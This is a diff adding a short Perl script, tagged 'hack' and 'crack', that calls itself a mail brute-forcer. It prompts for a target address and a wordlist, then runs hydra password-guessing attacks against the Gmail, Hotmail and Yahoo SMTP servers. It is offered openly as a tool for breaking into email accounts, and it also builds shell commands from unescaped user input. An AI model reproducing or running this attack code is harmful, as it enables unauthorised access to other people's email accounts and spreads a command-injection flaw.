@@ -1,0 +1,48 @@
+#labels perl,hack,crack,mail,password,recovery,brute,force,tool,debian
+#!/usr/bin/perl
+
+# This is a simple Mail BruteForcer (Cracker) that can
+# bruteforce Yahoo, Gmail and Hotmail mail's. In the next
+# version we will add more SMTP servers.
+# Keep in touch!
+# Author 		: mR.Thg !
+# Contact 	 	: mr.thg@techie.com
+# Script version 	: 1.0
+# Tested OS 		: Debian
+# Release date 		: 29/6/2013
+# Next Release 		: 01/7/2013
+# Enjoy! 
+
+use warnings;
+
+system("clear");
+print("Multiple Mail Bruter v1.0!");
+print("\n 1. Yahoo");
+print("\n 2. Hotmail");
+print("\n 3. Gmail");
+print("\n");
+
+print("Chose SMTP: ");
+$menu=<STDIN>; 
+chomp($menu);
+
+print "Mail: ";
+$mail=<STDIN>; 
+chomp($mail);
+print "List: ";
+$list=<STDIN>;
+chomp($list);
+
+if ( $menu == 3 ) 
+	{ 
+	system( "hydra -S -l " . $mail . " -P " . $list . "  -e ns -V -s 465 smtp.gmail.com smtp" ); 
+	}
+if ( $menu == 2 ) 
+	{ 
+	system( "hydra -S -l " . $mail . " -P " . $list . "  -e ns -V -s 587 smtp.live.com smtp" ); 
+	}
+if ( $menu == 1 )
+	{
+	system( "hydra -S -l " . $mail . " -P " . $list . "  -e ns -V -s 465 smtp.mail.yahoo.com smtp" ); 
+	}
+__END__
